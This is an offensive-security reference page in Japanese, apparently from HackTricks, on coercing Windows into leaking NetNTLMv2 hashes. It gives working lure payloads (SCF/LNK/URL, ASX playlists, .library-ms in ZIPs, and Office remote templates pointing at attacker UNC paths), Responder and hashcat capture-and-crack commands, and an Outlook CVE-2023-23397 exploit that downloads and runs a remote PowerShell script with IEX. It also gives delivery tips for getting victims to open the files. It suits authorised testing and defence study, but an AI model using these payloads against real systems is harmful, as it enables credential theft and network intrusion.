# NTLM クレデンシャルを盗む場所

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) の優れたアイデアをすべて確認してください。オンラインでの microsoft word ファイルのダウンロードから ntlm leaks のソース: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md および [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### 書き込み可能な SMB 共有 + Explorer トリガーの UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

もしユーザやスケジュールされたジョブが Explorer で参照する共有に**書き込める**なら、メタデータがあなたの UNC を指すファイル（例: `\\ATTACKER\share`）を置いてください。フォルダをレンダリングすると**implicit SMB authentication**がトリガーされ、**NetNTLMv2**があなたのリスナーに leaks します。

1. **誘導ファイルを生成する** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **書き込み可能な共有にそれらを置く** (被害者が開く任意のフォルダー):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows は同時に複数のファイルにアクセスすることがあり、Explorer がプレビューするもの（`BROWSE TO FOLDER`）はクリック不要です。

### Windows Media Player のプレイリスト (.ASX/.WAX)

ターゲットにあなたが制御する Windows Media Player のプレイリストを開かせるかプレビューさせることができれば、エントリを UNC パスに向けることで Net‑NTLMv2 を leak させることができます。WMP は参照されたメディアを SMB 経由で取得しようとし、自動的に認証を行います。

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
収集と cracking の流れ:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIPに埋め込まれた .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer は ZIP アーカイブ内から直接開かれた .library-ms ファイルを安全でない方法で処理します。ライブラリ定義がリモートの UNC パス（例: \\attacker\share）を指している場合、ZIP 内の .library-ms を単に参照/起動するだけで Explorer が UNC を列挙し、attacker に NTLM 認証を送信します。これにより NetNTLMv2 が得られ、オフラインでクラッキングできるか、あるいはリレーされる可能性があります。

attacker UNC を指す最小限の .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- 上記の XML で .library-ms ファイルを作成する（IP/hostname を設定する）。
- それを ZIP に圧縮する（on Windows: Send to → Compressed (zipped) folder）し、ZIP をターゲットに配布する。
- NTLM キャプチャリスナーを実行し、被害者が ZIP 内から .library-ms を開くのを待つ。


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows はカレンダーアイテムの拡張 MAPI プロパティ PidLidReminderFileParameter を処理していました。もしそのプロパティが UNC パス（例: \\attacker\share\alert.wav）を指していると、リマインダーが発火した際に Outlook は SMB 共有にアクセスし、ユーザーの Net‑NTLMv2 を leak してしまいます（クリック不要）。この脆弱性は 2023 年 3 月 14 日にパッチされましたが、未更新の環境や過去のインシデント対応では依然として重要です。

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener側:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
注意
- 被害者はリマインダーが発動したときに Outlook for Windows が実行されているだけで十分です。
- この leak は offline cracking または relay に適した Net‑NTLMv2 を生成します（pass‑the‑hash には使えません）。


### .LNK/.URL アイコンベースの zero‑click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 のバイパス)

Windows Explorer はショートカットのアイコンを自動でレンダリングします。最近の研究により、Microsoft’s April 2025 patch for UNC‑icon shortcuts 適用後であっても、ショートカットのターゲットを UNC path 上にホストしアイコンをローカルに保持することで、クリック不要で NTLM 認証をトリガーできることが示されました（パッチバイパスは CVE‑2025‑50154 に割り当てられました）。フォルダを単に表示するだけで Explorer はリモートターゲットからメタデータを取得し、攻撃者の SMB サーバに NTLM を送信します。

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell を使った Program Shortcut payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- ZIP にショートカットを入れて被害者に参照させる。
- 被害者が開く書き込み可能な共有にショートカットを配置する。
- 同じフォルダ内の他の誘導ファイルと組み合わせて、Explorer がアイテムをプレビューするようにする。


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office ドキュメントは外部テンプレートを参照できます。添付テンプレートを UNC path に設定すると、ドキュメントを開いた際に SMB に対して認証が行われます。

Minimal DOCX relationship changes (inside word/):

1) word/settings.xml を編集し、添付テンプレート参照を追加する:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels を編集し、rId1337 をあなたの UNC に向けます:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docxに再パッケージして納品する。SMB capture listener を実行し、ファイルが開かれるのを待つ。

キャプチャ後に relaying や abusing NTLM に関するアイデアは、以下を参照してください:

{{#ref}}
README.md
{{#endref}}


## 参考文献
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
